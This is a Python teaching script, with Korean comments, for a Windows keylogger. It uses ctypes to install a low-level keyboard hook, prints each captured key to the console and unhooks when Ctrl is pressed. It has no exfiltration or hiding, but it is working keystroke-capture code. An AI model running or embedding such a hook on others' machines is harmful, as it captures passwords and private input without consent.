import sys
from ctypes import *
from ctypes.wintypes import MSG
from ctypes.wintypes import DWORD

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
※ windll 사용
windll을 사용해서 user32와 kernel32형 변수를 선언한다.
해당 DLL에서 제공하는 함수를 사용할 때는 'user32.API명' 또는 'kernel32.API명'과 같은 방식으로 사용 
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

user32 = windll.user32
kernel32 = windll.kernel32

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
※ 변수사용
Win32 API 내부에서 정의해서 사용하는 변수값들은 MSDN이나 인터넷 검색을 통해 쉽게 확인가능 
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
CTRL_CODE = 162

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
※ 클래스정의
훅을 설정하고 해제하는 기능을 가진 클래스 정의 
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""


class KeyLogger:
    def __init__(self):
        self.lUser32 = user32
        self.hooked = None

    # user32 DLL의 SetWindowsHookExA() 함수로 훅 설정, WH_KEYBOARD_LL 이벤트 모니터링
    def installHookProc(self, pointer):
        #self.hooked = self.lUser32.SetWindowsHookExA(WH_KEYBOARD_LL, pointer, kernel32.GetModuleHandleW(None), 0)

        self.hooked = self.lUser32.SetWindowsHookExA(13,
                                                     pointer,
                                                     None,
                                                     0)

        if not self.hooked:
            return False
        return True

    # user32 DLL의 UnHookWindowsHookExA() 함수로 훅 해제, 훅은 시스템 부하를 야기하므로 적절한 시기에 해제 필요
    def uninstallHookProc(self):
        if self.hooked is None:
            return
        self.lUser32.UnhookWindowsHookEx(self.hooked)
        self.hooked = None


"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
※ 함수포인터 도출
훅 프로시저를 등록하려면 함수의포인터를 전달해야한다.
ctypes에서 이를 위한 메서드 제공 -> CFUNCTYPE을 통해 SetwindowsHookExA() 함수에 맞는 인자형 선택

"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""


def getFPTR(fn):
    CMPFUNC = CFUNCTYPE(c_int, c_int, c_int, POINTER(c_void_p))
    return CMPFUNC(fn)


"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
※ 훅 프로시저 정의
훅 프로시저는 이벤트가 발생했을 때 사용자 단에서 처리를 담당하는 콜백 함수다.
들어온 메시지의 종류가 WM_KEYDOWN에 해당하면 메시지 값을 화면에 프린트해주고,
메시지 값이  키의 값과 일치하면 훅을 제거한다.
처리가 끝나면 훅체인에 있는 다른 훅 프로시저에게 제어권을 넘겨준다. 
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""


def hookProc(nCode, wParam, lParam):
    if wParam is not WM_KEYDOWN:
        return user32.CallNextHookEx(
            myKeyLogger.hooked,
            nCode,
            wParam,
            lParam
        )
    hookedKey = chr(lParam[0])
    print(hookedKey)
    if (CTRL_CODE == int(lParam[0])):
        print("Ctrl pressed, call uninstallHook()")
        myKeyLogger.uninstallHookProc()
        sys.exit(-1)
    return user32.CallNextHookEx(myKeyLogger.hooked, nCode, wParam, lParam)


"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
※ 메시지 전달
GetMessageA() 함수는 큐를 모니터링하고 있다가 큐에 메시지가 들어오면 메시지를 꺼내서
훅 체인에 등록된 맨 처음의 훅으로 전달하는 역할을 한다.
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""


def startKeyLog():
    msg = MSG()
    user32.GetMessageA(byref(msg), 0, 0, 0)


# 훅 프로세스 시작
myKeyLogger = KeyLogger()
pointer = getFPTR(hookProc)

if myKeyLogger.installHookProc(pointer):
    print("installed keyLogger")
else:
    print("Not installed keyLogger")
    exit(-1)
startKeyLog()

